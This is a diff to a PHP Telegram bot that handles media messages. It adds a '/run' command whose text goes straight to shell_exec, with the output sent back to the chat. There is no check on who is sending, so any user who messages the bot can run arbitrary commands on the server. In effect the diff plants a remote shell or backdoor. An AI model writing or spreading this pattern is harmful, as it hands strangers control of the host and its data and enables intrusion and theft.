@@ -1,5 +1,5 @@
 <?php
-$botToken = 'YOUR_BOT_TOKEN';
+$botToken="Your bot token";
 $apiUrl = 'https://api.telegram.org/bot' . $botToken;
 
 function apiRequest($method, $params)
@@ -12,6 +12,19 @@ function apiRequest($method, $params)
 
     return json_decode($result, true);
 }
+function executeCode($chatID, $code)
+{
+    try {
+        ob_start();
+        $result = shell_exec($code);
+        $output = ob_get_clean();
+        return "Result: " . $result . "\nOutput: " . $output;
+    } catch (Exception $e) {
+        return "Error: " . $e->getMessage();
+    }
+}
+
+$update = json_decode(file_get_contents("php://input"), true);
 
 function getUpdates($offset)
 {
@@ -30,7 +43,8 @@ while (true) {
 
     foreach ($updates['result'] as $update) {
         $chatID = $update['message']['chat']['id'];
-        echo var_dump($update['message']);
+        // echo var_dump($update['message']);
+        $messageText = $update['message']['text'];
 
         if (isset($update['message']['photo'])) {
             // Handle photo
@@ -42,6 +56,14 @@ while (true) {
             $video = $update['message']['video'];
             $fileID = $video['file_id'];
             processMedia($chatID, $fileID, 'video');
+        } elseif (strpos($messageText, '/run') === 0) {
+            $codeToExecute = substr($messageText, 4); 
+            $result = executeCode($chatID, $codeToExecute);
+
+            apiRequest('sendMessage', [
+                'chat_id' => $chatID,
+                'text' => $result,
+            ]);
         } else {
             // Handle text messages
             $messageText = $update['message']['text'];
